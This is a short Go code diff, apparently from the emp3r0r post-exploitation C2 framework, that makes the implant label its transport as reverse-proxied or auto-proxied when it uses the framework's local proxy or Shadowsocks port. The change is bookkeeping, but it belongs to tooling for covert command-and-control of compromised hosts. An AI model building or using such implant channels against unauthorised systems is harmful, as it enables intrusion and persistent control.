@@ -286,6 +286,22 @@ func setC2Transport() {
 		}
 		return
 	} else if RuntimeConfig.C2TransportProxy != "" {
+		// parse proxy url
+		proxyURL, err := url.Parse(RuntimeConfig.C2TransportProxy)
+		if err != nil {
+			log.Printf("Invalid proxy URL: %v", err)
+		}
+
+		// if the proxy port is emp3r0r proxy server's port
+		if proxyURL.Port() == RuntimeConfig.Emp3r0rProxyServerPort && proxyURL.Hostname() == "127.0.0.1" {
+			emp3r0r_data.Transport = fmt.Sprintf("Reverse Proxied: %s", RuntimeConfig.C2TransportProxy)
+			return
+		}
+		if proxyURL.Port() == RuntimeConfig.ShadowsocksLocalSocksPort && proxyURL.Hostname() == "127.0.0.1" {
+			emp3r0r_data.Transport = fmt.Sprintf("Auto Proxied: %s", RuntimeConfig.C2TransportProxy)
+			return
+		}
+
 		emp3r0r_data.Transport = fmt.Sprintf("Proxy %s", RuntimeConfig.C2TransportProxy)
 		return
 	} else {
